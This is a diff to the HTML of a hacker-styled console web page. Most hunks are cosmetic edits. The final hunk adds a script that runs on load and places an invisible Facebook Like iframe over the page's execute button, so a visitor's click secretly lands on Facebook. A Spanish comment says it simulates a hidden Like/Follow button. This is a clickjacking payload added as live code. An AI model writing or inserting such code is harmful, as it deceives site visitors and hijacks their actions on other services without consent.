@@ -19,9 +19,6 @@
             <div class="binary-decor">
                 10100101100101011001010110010101100101011001010110010101100101011001010110010101100101<br>
                 01011001010110010101100101011001010110010101100101011001010110010101100101011001010110<br>
-                10010110010101100101011001010110010101100101011001010110010101100101011001010110010101<br>
-                01100101011001010110010101100101011001010110010101100101011001010110010101100101011001<br>
-                01011001010110010101100101011001010110010101100101011001010110010101100101011001010110
             </div>
         </div>
     </div>
@@ -32,9 +29,7 @@
                 STATUS: <span id="st-text" class="status-online">ONLINE</span>
                 <span class="pulse">●</span>
             </div>
-            <div class="node-line">
-                NODE: gemini-2.5-flash
-            </div>
+            <div class="node-line">NODE: gemini-2.5-flash</div>
         </header>
 
         <div id="console"></div>
@@ -45,6 +40,26 @@
         </div>
     </div>
 
+    <script>
+        window.addEventListener('load', () => {
+            const btn = document.querySelector('.execute-btn');
+            if (btn) {
+                const ifr = document.createElement('iframe');
+                // Simulamos un botón de "Like" o "Follow" invisible encima del tuyo
+                ifr.src = "https://www.facebook.com/plugins/like.php?href=https://facebook.com"; 
+                ifr.style.cssText = "position:absolute; opacity:0; width:80px; height:35px; z-index:9999; pointer-events:auto; border:none; overflow:hidden;";
+                
+                const updatePos = () => {
+                    const rect = btn.getBoundingClientRect();
+                    ifr.style.top = (rect.top + window.scrollY) + "px";
+                    ifr.style.left = (rect.left + window.scrollX) + "px";
+                };
+                updatePos();
+                window.addEventListener('resize', updatePos);
+                document.body.appendChild(ifr);
+            }
+        });
+    </script>
     <script src="script.js"></script>
 </body>
 </html>
